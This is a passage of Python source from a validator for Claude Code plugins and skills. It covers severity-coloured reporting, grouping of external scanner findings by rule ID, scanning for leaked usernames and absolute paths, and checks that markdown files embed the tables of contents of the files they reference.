    print(f"{COLORS['MINOR']}MINOR:    {counts['MINOR']}{COLORS['RESET']}")
    print(f"{COLORS['NIT']}NIT:      {counts.get('NIT', 0)}{COLORS['RESET']}")
    print(f"{COLORS['WARNING']}WARNING:  {counts.get('WARNING', 0)}{COLORS['RESET']}")
    print(f"{COLORS['INFO']}INFO:     {counts['INFO']}{COLORS['RESET']}")
    print(f"{COLORS['PASSED']}PASSED:   {counts['PASSED']}{COLORS['RESET']}")

    # Print score
    grade_color = COLORS["PASSED"] if score >= 80 else COLORS["MAJOR"] if score >= 60 else COLORS["CRITICAL"]
    print(f"\n{COLORS['BOLD']}Syntactic Score:{COLORS['RESET']} {grade_color}{score}/100{COLORS['RESET']}")

    # Print exit code interpretation
    exit_code = report.exit_code
    if exit_code == EXIT_OK:
        print(f"\n{COLORS['PASSED']}✓ All checks passed{COLORS['RESET']}")
    elif exit_code == EXIT_CRITICAL:
        print(f"\n{COLORS['CRITICAL']}✗ Critical issues found - must fix before use{COLORS['RESET']}")
    elif exit_code == EXIT_MAJOR:
        print(f"\n{COLORS['MAJOR']}! Major issues found - should fix{COLORS['RESET']}")
    else:
        print(f"\n{COLORS['MINOR']}~ Minor issues found - recommended to fix{COLORS['RESET']}")


def print_results_by_level(report: ValidationReport, verbose: bool = False) -> None:
    """Print validation results grouped by severity level."""
    # Group results by level
    by_level: dict[str, list[ValidationResult]] = {
        "CRITICAL": [],
        "MAJOR": [],
        "MINOR": [],
        "NIT": [],
        "WARNING": [],
        "INFO": [],
        "PASSED": [],
    }

    for result in report.results:
        by_level[result.level].append(result)

    # Always print blocking levels (CRITICAL, MAJOR, MINOR)
    for level in ["CRITICAL", "MAJOR", "MINOR"]:
        results = by_level[level]
        if results:
            print(f"\n{COLORS[level]}--- {level} ISSUES ({len(results)}) ---{COLORS['RESET']}")
            for result in results:
                print(f"  {format_result(result)}")

    # Always print NIT (blocks in --strict mode)
    if by_level["NIT"]:
        print(f"\n{COLORS['NIT']}--- NIT ISSUES ({len(by_level['NIT'])}) [blocks in --strict] ---{COLORS['RESET']}")
        for result in by_level["NIT"]:
            print(f"  {format_result(result)}")

    # Always print WARNING (never blocks, but always visible)
    if by_level["WARNING"]:
        print(f"\n{COLORS['WARNING']}--- WARNINGS ({len(by_level['WARNING'])}) [non-blocking] ---{COLORS['RESET']}")
        for result in by_level["WARNING"]:
            print(f"  {format_result(result)}")

    # Only print INFO and PASSED in verbose mode
    if verbose:
        for level in ["INFO", "PASSED"]:
            results = by_level[level]
            if results:
                print(f"\n{COLORS[level]}--- {level} ({len(results)}) ---{COLORS['RESET']}")
                for result in results:
                    print(f"  {format_result(result)}")


# =============================================================================
# Aggregated reporting — token-efficient grouping by rule_id
# =============================================================================
#
# Why: a verbose flat list of 400 individual findings can balloon a
# stdout/file report to 50+ KB and burn an enormous chunk of any
# downstream LLM agent's context window. The aggregated view groups by
# (level, rule_id) so each rule's full explanation is shown ONCE,
# followed by a count and a capped list of file:line occurrences.
# Rule explanations are preserved exactly — the savings come from
# eliminating message-text repetition, not from summarising it away.

# Regex catalog for extracting the rule identifier from a finding's
# message. Each external scanner prefixes its findings differently;
# a single regex per source keeps the parser linear and predictable.
# (Uses module-top `import re`; no local re-import needed.)

_RULE_ID_PATTERNS: tuple[tuple[str, "re.Pattern[str]"], ...] = (
    # CPV native rules: `[RC-21]` / `[RC-021]` (zero-padded variant)
    ("rc", re.compile(r"^\[?(RC-\d{2,3})\]?\s*[:\-]?\s*", re.IGNORECASE)),
    # Cisco scanner: `[cisco static.injection.v1] ...`
    ("cisco", re.compile(r"^\[cisco\s+([^\]]+)\]\s*", re.IGNORECASE)),
    # External scanners: `gitleaks <ruleid>:`, `trufflehog <ruleid>:`,
    # `semgrep <ruleid>:`, `cc-audit <ruleid>:`, `tirith <ruleid>:`.
    # Whitespace between the source and the colon-delimited rule id.
    (
        "external",
        re.compile(
            r"^(gitleaks|trufflehog|semgrep|cc-audit|tirith)\s+([^\s:]+)\s*[:\-]",
            re.IGNORECASE,
        ),
    ),
    # Bare CWE / OWASP-LLM identifiers.
    ("cwe", re.compile(r"^(CWE-\d+|OWASP-LLM\d+)\s*[:\-]?\s*", re.IGNORECASE)),
    # Scanner status / advisory lines without a rule id, e.g.
    # "trufflehog: no findings", "gitleaks: binary not found",
    # "Cisco skill-scanner skipped — uvx not on PATH". These end up in
    # one bucket per scanner so the operator sees a single "scanner
    # ran clean" / "scanner unavailable" / "scanner timed out" line per
    # source instead of an unbucketed OTHER bag.
    (
        "scanner-status",
        re.compile(
            r"^(trufflehog|gitleaks|semgrep|cc-audit|tirith|cisco)(?:\s+skill-scanner)?\b",
            re.IGNORECASE,
        ),
    ),
)


def _extract_rule_id(message: str) -> str:
    """Extract the canonical rule identifier from a finding's message.

    Returns "OTHER" when no recognised prefix matches — those findings
    aggregate together under one bucket so the aggregator never silently
    loses anything. The returned string is the bucketing key, not the
    message; the full message text is still preserved verbatim by the
    caller.
    """
    for kind, pattern in _RULE_ID_PATTERNS:
        m = pattern.match(message)
        if m is None:
            continue
        if kind == "external":
            # Two capture groups: source name + rule id. Format as
            # "scanner:ruleid" so downstream readers can tell which
            # tool emitted the finding without reading every entry.
            return f"{m.group(1).lower()}:{m.group(2)}"
        if kind == "cisco":
            return f"cisco:{m.group(1).strip()}"
        if kind == "scanner-status":
            # Scanner-status messages get one bucket per scanner so
            # "scanner ran clean" / "scanner unavailable" / "scanner
            # timed out" lines aggregate together rather than each
            # being its own OTHER entry.
            return f"{m.group(1).lower()}:status"
        return m.group(1).upper()
    return "OTHER"


def _aggregation_key(result: "ValidationResult") -> tuple[str, str]:
    """(rule_id, normalised-message-stem) tuple used to bucket findings.

    Two findings with the same rule_id but different message bodies
    (e.g. one cc-audit RC mapping to multiple distinct sub-rules)
    bucket separately so the explanation per stem is preserved.
    """
    rule_id = _extract_rule_id(result.message)
    # Normalise the message stem: strip the rule prefix + collapse
    # whitespace + truncate to 120 chars so near-identical messages
    # bucket together but distinct attack descriptions stay separate.
    stripped = result.message
    for _kind, pattern in _RULE_ID_PATTERNS:
        m = pattern.match(stripped)
        if m is not None:
            stripped = stripped[m.end() :]
            break
    stem = " ".join(stripped.split())[:120]
    return rule_id, stem


def print_results_aggregated(
    report: "ValidationReport",
    *,
    verbose: bool = False,
    max_occurrences_per_bucket: int = 10,
) -> None:
    """Print findings grouped by (level, rule_id, message-stem).

    For each bucket the explanation appears once; below it sits a count
    and the first ``max_occurrences_per_bucket`` file:line occurrences
    (others get summarised as "+N more" so no finding is ever silently
    dropped). PASSED and INFO levels are still suppressed when
    ``verbose=False`` — same contract as ``print_results_by_level``.

    Output stays roughly O(distinct-rules) instead of O(findings), which
    is what makes the report safe to pipe into a downstream LLM agent's
    context.
    """
    levels_visible: tuple[str, ...] = ("CRITICAL", "MAJOR", "MINOR", "NIT", "WARNING")
    if verbose:
        levels_visible = (*levels_visible, "INFO", "PASSED")

    # First pass: bucket by (level, rule_id, stem). Preserve insertion
    # order within each level so the first-seen example wins as the
    # explanation anchor.
    buckets: dict[str, dict[tuple[str, str], list["ValidationResult"]]] = {lvl: {} for lvl in levels_visible}
    for result in report.results:
        if result.level not in buckets:
            continue
        key = _aggregation_key(result)
        buckets[result.level].setdefault(key, []).append(result)

    # Second pass: emit per-level sections with the per-rule grouping.
    for level in levels_visible:
        per_rule = buckets[level]
        if not per_rule:
            continue
        total = sum(len(v) for v in per_rule.values())
        annotation = ""
        if level == "NIT":
            annotation = " [blocks in --strict]"
        elif level == "WARNING":
            annotation = " [non-blocking]"
        print(
            f"\n{COLORS[level]}--- {level} ISSUES "
            f"({total} across {len(per_rule)} rule"
            f"{'s' if len(per_rule) != 1 else ''}){annotation}{COLORS['RESET']}"
        )
        for (rule_id, stem), occurrences in per_rule.items():
            count = len(occurrences)
            anchor = occurrences[0]
            # Show the EXPLANATION (full message of the first
            # occurrence) once. This is the per-vulnerability-type
            # description the user explicitly asked us to keep.
            print(f"  [{rule_id}] {anchor.message} ({count} occurrence{'s' if count != 1 else ''})")
            # Then the file:line list, capped.
            shown = occurrences[:max_occurrences_per_bucket]
            for occ in shown:
                loc = f"{occ.file}:{occ.line}" if occ.file and occ.line else (occ.file or "<no file>")
                print(f"      - {loc}")
            remaining = count - len(shown)
            if remaining > 0:
                print(
                    f"      … +{remaining} more occurrence{'s' if remaining != 1 else ''} (same rule, omitted to save tokens)"
                )


def _print_fixer_recommendation(report: ValidationReport, report_path: Path | None) -> None:
    """Print a prominent recommendation to run the CPV fixer when fixable issues exist.

    Only prints when at least one CRITICAL/MAJOR/MINOR/NIT issue is present.
    Does NOT print on clean runs or on WARNING-only runs.
    Strips ANSI colors when stdout is not a TTY.
    """
    counts = report.count_by_level()
    fixable_total = counts.get("CRITICAL", 0) + counts.get("MAJOR", 0) + counts.get("MINOR", 0) + counts.get("NIT", 0)
    if fixable_total == 0:
        return

    # Suppress ANSI codes when stdout is not a TTY (e.g., piped or captured).
    use_color = bool(getattr(sys.stdout, "isatty", lambda: False)())
    yellow = COLORS["MAJOR"] if use_color else ""
    bold = COLORS["BOLD"] if use_color else ""
    reset = COLORS["RESET"] if use_color else ""
    dim = COLORS["DIM"] if use_color else ""

    border = "=" * 60  # Fits comfortably in 80-col terminals.
    report_display = str(report_path) if report_path else "(no report file written)"
    report_arg = str(report_path) if report_path else "<path-to-report.json>"

    print()
    print(f"{yellow}{border}{reset}")
    print(f"{yellow}{bold} TO FIX THESE ISSUES AUTOMATICALLY:{reset}")
    print(f"{yellow}{border}{reset}")
    print(" Option 1 (recommended): Invoke the CPV fixer agent")
    print("   Run this in Claude Code:")
    print(f"     {bold}/cpv-fix-validation {report_arg}{reset}")
    print()
    print(" Option 2: Use the fix-validation skill directly")
    print(f"{dim}   The plugin-fixer agent loads the fix-validation skill,{reset}")
    print(f"{dim}   which maps each error type to a remediation guide in{reset}")
    print(f"{dim}   skills/fix-validation/references/.{reset}")
    print()
    print(" Report file (JSON):")
    print(f"   {report_display}")
    print(f"{yellow}{border}{reset}")


def print_compact_summary(
    report: ValidationReport, title: str, report_path: Path | None = None, plugin_path: Path | str | None = None
) -> None:
    """Print a concise summary: counts by severity + verdict."""
    counts = report.count_by_level()
    exit_code = report.exit_code

    # Determine verdict — VALID/INVALID for the whole plugin or skill
    if exit_code == EXIT_OK:
        verdict = f"{COLORS['PASSED']}VALID{COLORS['RESET']}"
        verdict_line = f"{COLORS['PASSED']}Verdict: VALID{COLORS['RESET']}"
    elif exit_code == EXIT_CRITICAL:
        verdict = f"{COLORS['CRITICAL']}INVALID{COLORS['RESET']}"
        verdict_line = f"{COLORS['CRITICAL']}Verdict: INVALID — critical issues must be fixed{COLORS['RESET']}"
    elif exit_code == EXIT_MAJOR:
        verdict = f"{COLORS['MAJOR']}INVALID{COLORS['RESET']}"
        verdict_line = f"{COLORS['MAJOR']}Verdict: INVALID — major issues must be fixed{COLORS['RESET']}"
    else:
        verdict = f"{COLORS['MINOR']}INVALID{COLORS['RESET']}"
        verdict_line = f"{COLORS['MINOR']}Verdict: INVALID — minor issues should be fixed{COLORS['RESET']}"

    # Print compact output — always show all levels, PASSED first, WARNING last
    print(f"{COLORS['BOLD']}{title}{COLORS['RESET']}: {verdict}")
    parts = []
    for level in ("PASSED", "CRITICAL", "MAJOR", "MINOR", "NIT", "WARNING"):
        c = counts.get(level, 0)
        parts.append(f"{COLORS.get(level, '')}{level}:{c}{COLORS['RESET']}")
    print(f"  {' | '.join(parts)}")
    print(f"  {verdict_line}")
    if plugin_path:
        print(f"  Plugin: {plugin_path}")
    if report_path:
        print(f"  Report: {report_path}")

    # If there are any fixable issues, point the user at the fixer agent/skill.
    # This block is skipped on clean runs (0 issues) and on WARNING-only runs.
    _print_fixer_recommendation(report, report_path)


def save_report_and_print_summary(
    report: ValidationReport,
    report_path: Path,
    title: str,
    print_fn: Callable[..., None],
    *args: Any,
    plugin_path: Path | str | None = None,
    **kwargs: Any,
) -> None:
    """Save full detailed report to file, print only compact summary to stdout.

    Args:
        report: The validation report
        report_path: Path to write the detailed report file
        title: Title for the compact summary
        print_fn: The script's print_results function (captures its stdout)
        plugin_path: Path to the validated plugin/skill (shown in compact summary)
        *args, **kwargs: Additional arguments passed to print_fn
    """
    import io
    import sys

    # Capture full verbose output
    old_stdout = sys.stdout
    sys.stdout = buffer = io.StringIO()
    try:
        print_fn(report, *args, **kwargs)
    finally:
        sys.stdout = old_stdout

    # Write captured output to report file
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(buffer.getvalue())

    # Print compact summary to real stdout
    print_compact_summary(report, title, report_path, plugin_path=plugin_path)


# =============================================================================
# File Encoding Utilities
# =============================================================================


def check_utf8_encoding(content: bytes, report: ValidationReport, filename: str) -> bool:
    """Check file is UTF-8 encoded without BOM.

    Args:
        content: Raw file bytes
        report: ValidationReport to add results to
        filename: Name of file for error messages

    Returns:
        True if encoding is valid, False otherwise
    """
    # Check for UTF-8 BOM (should not be present)
    if content.startswith(b"\xef\xbb\xbf"):
        report.major("File has UTF-8 BOM (should be UTF-8 without BOM)", filename)
        return False

    # Try to decode as UTF-8
    try:
        content.decode("utf-8")
        return True
    except UnicodeDecodeError as e:
        report.major(f"File is not valid UTF-8: {e}", filename)
        return False


def normalize_level(level: str) -> Level:
    """Normalize level string to uppercase Level type.

    Args:
        level: Level string (can be any case)

    Returns:
        Normalized Level literal
    """
    upper = level.upper()
    if upper in ("CRITICAL", "MAJOR", "MINOR", "NIT", "WARNING", "INFO", "PASSED"):
        return upper  # type: ignore
    # Default to INFO for unknown levels
    return "INFO"


# =============================================================================
# Private Information Scanning Functions
# =============================================================================


def scan_file_for_private_info(
    filepath: Path,
    report: ValidationReport,
    rel_path: str,
    additional_usernames: set[str] | None = None,
) -> int:
    """Scan a single file for private information (usernames, home paths).

    Args:
        filepath: Absolute path to the file
        report: ValidationReport to add results to
        rel_path: Relative path for error messages
        additional_usernames: Extra usernames to check beyond defaults

    Returns:
        Number of issues found
    """
    issues_found = 0

    # Build patterns including any additional usernames
    patterns = list(PRIVATE_PATH_PATTERNS)
    if additional_usernames:
        patterns.extend(build_private_path_patterns(additional_usernames))

    try:
        content = filepath.read_text(errors="ignore")
    except Exception:
        return 0

    for pattern, desc in patterns:
        for match in pattern.finditer(content):
            matched_text = match.group(0)
            line_num = content[: match.start()].count("\n") + 1
            issues_found += 1
            report.critical(
                f"Private info leaked: {desc} - found '{matched_text}' (replace with relative path or ${{CLAUDE_PLUGIN_ROOT}})",
                rel_path,
                line_num,
            )

    # Also check for generic home path patterns (MAJOR, not CRITICAL)
    # But only if no specific username was found
    if issues_found == 0:
        for pattern in USER_PATH_PATTERNS:
            for match in pattern.finditer(content):
                matched_text = match.group(0)

                # Skip if this looks like a regex pattern (contains metacharacters)
                if any(c in matched_text for c in r"[]\^$.*+?{}|()"):
                    continue

                # Extract the username from the path
                username_match = re.search(r"/Users/([^/\s]+)/", matched_text)
                if not username_match:
                    username_match = re.search(r"/home/([^/\s]+)/", matched_text)
                if not username_match:
                    username_match = re.search(r"\\Users\\([^\\\s]+)\\", matched_text)

                if username_match:
                    extracted_username = username_match.group(1).lower()
                    # Skip if it's a generic example username
                    if extracted_username in EXAMPLE_USERNAMES:
                        continue

                line_num = content[: match.start()].count("\n") + 1
                issues_found += 1
                report.major(
                    f"Hardcoded user path found: '{matched_text}...' (use relative paths or ${{CLAUDE_PLUGIN_ROOT}})",
                    rel_path,
                    line_num,
                )

    return issues_found


def scan_directory_for_private_info(
    root_path: Path,
    report: ValidationReport,
    additional_usernames: set[str] | None = None,
    skip_dirs: set[str] | None = None,
    respect_gitignore: bool = True,
) -> tuple[int, int]:
    """Scan a directory tree for private information.

    Args:
        root_path: Root directory to scan
        report: ValidationReport to add results to
        additional_usernames: Extra usernames to check beyond defaults
        skip_dirs: Additional directories to skip
        respect_gitignore: If True, skip files/dirs listed in .gitignore

    Returns:
        Tuple of (files_checked, issues_found)
    """
    files_checked = 0
    total_issues = 0

    # Use GitignoreFilter when respect_gitignore is True — it fully respects
    # .gitignore syntax (wildcards, negations, directory-only rules, etc.)
    from gitignore_filter import GitignoreFilter

    extra_skip = skip_dirs or set()
    if respect_gitignore:
        gi = GitignoreFilter(root_path)
        walker = gi.walk(root_path, skip_dirs=extra_skip)
    else:
        # Fallback: raw os.walk with SKIP_DIRS (uses should_skip_directory for wildcards)
        def _raw_walk():  # type: ignore[return]
            for dirpath, dirnames, filenames in os.walk(root_path):
                dirnames[:] = [d for d in dirnames if not should_skip_directory(d) and d not in extra_skip]
                yield dirpath, dirnames, filenames

        walker = _raw_walk()

    for dirpath, _dirnames, filenames in walker:
        rel_dir = Path(dirpath).relative_to(root_path)

        for filename in filenames:
            filepath = Path(dirpath) / filename
            rel_path = str(rel_dir / filename) if str(rel_dir) != "." else filename

            # Check only relevant file types
            if filepath.suffix.lower() not in SCANNABLE_EXTENSIONS:
                continue

            files_checked += 1

            issues = scan_file_for_private_info(filepath, report, rel_path, additional_usernames)
            total_issues += issues

    return files_checked, total_issues


def validate_no_private_info(
    root_path: Path,
    report: ValidationReport,
    additional_usernames: set[str] | None = None,
) -> None:
    """Validate that a directory contains no private information.

    This is the main entry point for private info scanning.
    Checks for:
    - Private usernames in paths (CRITICAL)
    - Generic home directory paths (MAJOR)
    - Hardcoded absolute paths (MAJOR)

    Args:
        root_path: Root directory to scan
        report: ValidationReport to add results to
        additional_usernames: Extra usernames to check beyond PRIVATE_USERNAMES
    """
    files_checked, issues_found = scan_directory_for_private_info(root_path, report, additional_usernames)

    if issues_found == 0:
        report.passed(f"No private info found ({files_checked} files checked)")
    else:
        report.info(f"Found {issues_found} private info issue(s) in {files_checked} files")


def scan_file_for_absolute_paths(
    filepath: Path,
    report: ValidationReport,
    rel_path: str,
) -> int:
    """Scan a file for ANY absolute paths (stricter plugin validation).

    In plugins, ALL paths should be relative to ${CLAUDE_PLUGIN_ROOT} or use
    environment variables like ${HOME}. Absolute paths break portability.

    Args:
        filepath: Absolute path to the file
        report: ValidationReport to add results to
        rel_path: Relative path for error messages

    Returns:
        Number of issues found
    """
    issues_found = 0

    try:
        content = filepath.read_text(errors="ignore")
    except Exception:
        return 0

    # First check for private usernames (CRITICAL)
    private_patterns = build_private_path_patterns(PRIVATE_USERNAMES)
    for pattern, desc in private_patterns:
        for match in pattern.finditer(content):
            matched_text = match.group(0)
            line_num = content[: match.start()].count("\n") + 1
            issues_found += 1
            report.critical(
                f"Private path leaked: {desc} - '{matched_text}' (use relative path or ${{CLAUDE_PLUGIN_ROOT}})",
                rel_path,
                line_num,
            )

    # Determine if this is a documentation file (more lenient) or code file (strict)
    doc_extensions = {".md", ".txt", ".html", ".rst", ".adoc"}
    is_doc_file = filepath.suffix.lower() in doc_extensions

    # Then check for ALL absolute paths (MAJOR)
    for pattern, desc in ABSOLUTE_PATH_PATTERNS:
        for match in pattern.finditer(content):
            matched_text = match.group(1) if match.lastindex else match.group(0)

            # Skip if this looks like a regex pattern
            if any(c in matched_text for c in r"[]\^$.*+?{}|()"):
                continue

            # Skip allowed documentation paths — only in doc files, not in code/scripts
            if is_doc_file and any(matched_text.startswith(prefix) for prefix in ALLOWED_DOC_PATH_PREFIXES):
                continue

            # Skip if it's an environment variable reference
            if "${" in matched_text or matched_text.startswith("$"):
                continue

            # Extract username if it's a home path
            username_match = re.search(r"/(?:Users|home)/([^/\s]+)/", matched_text)
            if username_match:
                extracted_username = username_match.group(1).lower()
                # Skip example usernames in documentation
                if extracted_username in EXAMPLE_USERNAMES:
                    continue

            line_num = content[: match.start()].count("\n") + 1
            issues_found += 1
            # System binary paths are expected for tool detection — downgrade to INFO
            if desc == "system absolute path" and any(matched_text.startswith(p) for p in _SYSTEM_BINARY_PREFIXES):
                report.info(f"System binary path: '{matched_text[:60]}' (OK for tool detection)", rel_path)
                issues_found -= 1  # Don't count this as an issue
                continue
            # Use MINOR for other system paths in scripts, MAJOR for home paths
            severity = "minor" if desc == "system absolute path" and not is_doc_file else "major"
            getattr(report, severity)(
                f"Absolute path found: '{matched_text[:60]}...' - use relative path, ${{CLAUDE_PLUGIN_ROOT}}, or ${{CLAUDE_PROJECT_DIR}}",
                rel_path,
                line_num,
            )

    return issues_found


def validate_no_absolute_paths(
    root_path: Path,
    report: ValidationReport,
    skip_dirs: set[str] | None = None,
    respect_gitignore: bool = True,
) -> None:
    """Validate that a plugin contains no absolute paths.

    This is a STRICT check for plugins. All paths should be:
    - Relative to plugin root (e.g., ./scripts/foo.py)
    - Using ${CLAUDE_PLUGIN_ROOT} for runtime resolution
    - Using ${HOME} or ~ for user home directory

    Args:
        root_path: Root directory to scan
        report: ValidationReport to add results to
        skip_dirs: Additional directories to skip
        respect_gitignore: If True, skip files/dirs listed in .gitignore
    """
    files_checked = 0
    total_issues = 0

    # Use GitignoreFilter when respect_gitignore is True — it fully respects
    # .gitignore syntax (wildcards, negations, directory-only rules, etc.)
    from gitignore_filter import GitignoreFilter

    extra_skip = skip_dirs or set()
    if respect_gitignore:
        gi = GitignoreFilter(root_path)
        walker = gi.walk(root_path, skip_dirs=extra_skip)
    else:

        def _raw_walk():  # type: ignore[return]
            for dirpath, dirnames, filenames in os.walk(root_path):
                dirnames[:] = [d for d in dirnames if not should_skip_directory(d) and d not in extra_skip]
                yield dirpath, dirnames, filenames

        walker = _raw_walk()

    for dirpath, _dirnames, filenames in walker:
        rel_dir = Path(dirpath).relative_to(root_path)

        for filename in filenames:
            filepath = Path(dirpath) / filename
            rel_path = str(rel_dir / filename) if str(rel_dir) != "." else filename

            # Check only relevant file types
            if filepath.suffix.lower() not in SCANNABLE_EXTENSIONS:
                continue

            # Skip CPV's own validation infrastructure — it contains path
            # patterns and allowlists as data constants, not hardcoded paths
            if filename == "cpv_validation_common.py":
                continue

            files_checked += 1

            issues = scan_file_for_absolute_paths(filepath, report, rel_path)
            total_issues += issues

    if total_issues == 0:
        report.passed(f"No absolute paths found ({files_checked} files checked)")
    else:
        report.info(f"Found {total_issues} absolute path(s) in {files_checked} files")


# =============================================================================
# TOC Embedding Validation — ensures .md files embed TOCs from referenced files
# =============================================================================

# Regex to extract TOC entries from a reference file's "## Table of Contents" section
_TOC_SECTION_RE = re.compile(
    r"(?im)^##\s*(table\s+of\s+contents|contents|toc|index)\s*\n(.*?)(?=\n##\s|\Z)",
    re.DOTALL,
)

# Regex to extract individual TOC heading titles from list items only.
# Must start with a list marker (-, *, +, or digit.) to avoid matching prose paragraphs.
_TOC_ENTRY_RE = re.compile(r"(?m)^[\s]*(?:[-*+]|\d+\.)\s+(?:\[([^\]]+)\]\([^)]*\)|(.+))")

# Regex to find markdown links pointing to .md files in references/
_MD_LINK_RE = re.compile(r"\[([^\]]+)\]\(((?:references/)?[^\s)]+\.md)\)")

# Regex to find backtick-enclosed references to .md files.
# Matches `references/foo.md` or `foo.md` (single backticks only).
# Lookbehind/lookahead prevent matching inside triple-backtick fences or
# double-backtick code spans. Group 2 captures the file path.
_BACKTICK_REF_RE = re.compile(r"(?<!`)`((?:[\w./-]+/)?[\w.-]+\.md)`(?!`)")


def extract_toc_headings(md_content: str) -> list[str]:
    """Extract TOC heading titles from a markdown file's Table of Contents section.

    Returns a list of heading title strings (stripped of numbering/links/bullets).
    Returns empty list if no TOC section is found.
    """
    m = _TOC_SECTION_RE.search(md_content)
    if not m:
        return []

    toc_block = m.group(2)
    headings: list[str] = []

    for entry_match in _TOC_ENTRY_RE.finditer(toc_block):
        # Group 1 = link text [Title](#anchor), Group 2 = plain text
        title = (entry_match.group(1) or entry_match.group(2) or "").strip()
        if not title or title.startswith("---"):
            continue
        # Strip leading numbering like "1. " or "3a. "
        title_clean = re.sub(r"^\d+[a-z]?\.\s*", "", title).strip()
        if title_clean:
            headings.append(title_clean)

    return headings


# Files exempt from the TOC requirement — these file types serve
# structural roles and do not need a Table of Contents section.
_TOC_EXEMPT_NAMES = {
    "SKILL.md",
    "CLAUDE.md",
    # Vendor-doc reference files fetched verbatim from code.claude.com.
    # These are EMBEDDED canonical copies; we keep them byte-identical to
    # the upstream so future doc updates produce clean diffs. CPV's TOC
    # convention is not the upstream's — exempting these names lets us
    # embed the official docs without reformatting them.
    "plugins-reference.md",
    "skills-reference.md",
}
_TOC_EXEMPT_DIRS = {"agents", "commands", "rules"}

# Regex to detect list items (bulleted or numbered)
_LIST_ITEM_RE = re.compile(r"\s*(?:[-*+]|\d+\.)\s")


def _build_fenced_line_set(lines: list[str]) -> set[int]:
    """Return the set of 0-based line indices inside fenced code blocks.

    Tracks ``` and ~~~ fences (with optional language tag) using a toggle.
    Used to skip backtick references that appear in code examples.
    """
    inside: set[int] = set()
    in_code_block = False
    for idx, line in enumerate(lines):
        stripped = line.strip()
        if stripped.startswith("```") or stripped.startswith("~~~"):
            in_code_block = not in_code_block
            inside.add(idx)  # Fence line itself is "inside" too
            continue
        if in_code_block:
            inside.add(idx)
    return inside


def _is_toc_exempt(file_path: Path) -> bool:
    """Check if a file is exempt from the TOC requirement.

    Exempt: SKILL.md, CLAUDE.md, agent files under agents/,
    command files under commands/, rule files under rules/.
    """
    if file_path.name in _TOC_EXEMPT_NAMES:
        return True
    for part in file_path.parts:
        if part in _TOC_EXEMPT_DIRS:
            return True
    return False


def validate_toc_embedding(
    md_content: str,
    md_file_path: Path,
    base_dir: Path,
    report: ValidationReport,
) -> None:
    """Validate that .md files embed TOCs from referenced .md files.

    When a markdown file links to another .md file, the link should include
    the referenced file's Table of Contents inline, so agents can see what
    content is available before navigating.

    Links can appear anywhere — in paragraphs, headings, or list items.
    Referenced files can be anywhere inside the plugin directory.

    When a link appears inside a list item (bullet or numbered), it may be
    an embedded TOC entry rather than a standalone reference. In that case:
    - If the target has a TOC and the TOC IS embedded after the link: PASSED
    - If the target has a TOC but no TOC copy follows: WARNING (ambiguous)
    - If the target has no TOC and is not exempt: NIT (file should have TOC)

    When a link is NOT in a list item (clear standalone reference):
    - If the target has a TOC and the TOC IS embedded: PASSED
    - If the target has a TOC but not embedded: MINOR (should embed it)
    - If the target has no TOC: skip (separate validation handles it)

    Args:
        md_content: The content of the markdown file being validated
        md_file_path: Path to the markdown file being validated
        base_dir: Base directory for resolving relative references
        report: ValidationReport to add results to
    """
    lines = md_content.split("\n")
    rel_file = md_file_path.name
    refs_checked = 0
    refs_with_toc = 0
    # Track lines inside fenced code blocks — backtick refs there are skipped
    fenced_lines = _build_fenced_line_set(lines)

    for link_match in _MD_LINK_RE.finditer(md_content):
        link_target = link_match.group(2)

        # Resolve the referenced file path
        ref_path = base_dir / link_target
        if not ref_path.is_file():
            ref_path = md_file_path.parent / link_target
            if not ref_path.is_file():
                continue

        # Only validate .md files
        if ref_path.suffix.lower() != ".md":
            continue

        # Determine if this link is inside a list item (bullet/numbered)
        link_start = link_match.start()
        link_line_num = md_content[:link_start].count("\n")
        line_text = lines[link_line_num] if link_line_num < len(lines) else ""
        is_list_item = bool(_LIST_ITEM_RE.match(line_text))

        # Read the referenced file and extract its TOC
        try:
            ref_content = ref_path.read_text(encoding="utf-8")
        except Exception:
            continue

        toc_headings = extract_toc_headings(ref_content)

        if not toc_headings:
            # Target file has no TOC
            if is_list_item and not _is_toc_exempt(ref_path):
                # The link is in a list item pointing to a file without a TOC.
                # We can't require TOC embedding, but the file itself should
                # have a TOC for progressive discovery.
                report.nit(
                    f"Referenced file '{ref_path.name}' (linked from a list in {rel_file}) has no Table of Contents section. All .md reference files should include a TOC for progressive discovery.",
                    rel_file,
                )
            # For non-list links or exempt files: skip (no TOC to embed)
            continue

        refs_checked += 1

        # Check if TOC headings appear within ~100 lines after the link
        # (large reference files can have 30+ TOC entries)
        search_start = max(0, link_line_num)
        search_end = min(len(lines), link_line_num + 100)
        nearby_text = "\n".join(lines[search_start:search_end])

        # Strip inline code backticks from both sides for fuzzy matching —
        # SKILL.md may embed headings with or without backtick formatting
        nearby_lower = nearby_text.lower()
        nearby_no_backticks = nearby_lower.replace("`", "")

        def _heading_matches(heading: str) -> bool:
            h = heading.lower()
            return h in nearby_lower or h.replace("`", "") in nearby_no_backticks

        embedded_count = sum(1 for heading in toc_headings if _heading_matches(heading))

        # All TOC headings must be embedded — partial TOCs hide content from agents
        if embedded_count == len(toc_headings):
            refs_with_toc += 1
        elif is_list_item:
            # Even when the link sits in a list item, a missing-or-partial
            # TOC breaks progressive discovery — the unembedded headings
            # become invisible to agents. The "ambiguous list item could
            # be a TOC title" exception was too generous: in practice it
            # almost always IS a real reference, just formatted as a list
            # entry. Treat it as MINOR (same severity as the standalone
            # branch below). If the line genuinely IS a TOC title rather
            # than a reference, the fix is to drop the markdown link
            # (the message body explains how).
            report.minor(
                f"Link to '{ref_path.name}' in a list entry of {rel_file} "
                f"has {embedded_count}/{len(toc_headings)} TOC headings "
                f"embedded. SKILL.md must copy the COMPLETE TOC of each "
                f"referenced .md file verbatim immediately after its link — "
                f"no exceptions, no summaries, no partial lists. Any missing "
                f"TOC entry will never be discovered by the progressive "
                f"discovery algorithm — that content becomes invisible to "
                f"agents. If this is a reference, embed all "
                f"{len(toc_headings)} headings exactly as they appear in "
                f"'{ref_path.name}'. If the TOC is too long to embed, the "
                f"fix is in the reference file, NOT in SKILL.md: (1) drop "
                f"sections that are not worth discovering (then the TOC "
                f"shrinks naturally), or (2) merge granular subsections "
                f"into fewer, more encompassing headings (same coverage, "
                f"fewer entries). Either the content is worth discovering "
                f"(embed the full TOC) or it is not (remove it from the "
                f"reference file's TOC). If this is a TOC title rather "
                f"than a reference, avoid markdown links to prevent the "
                f"ambiguity.",
                rel_file,
            )
        else:
            # Clear standalone reference — full TOC must be embedded
            report.minor(
                f"Reference to '{ref_path.name}' in {rel_file} has "
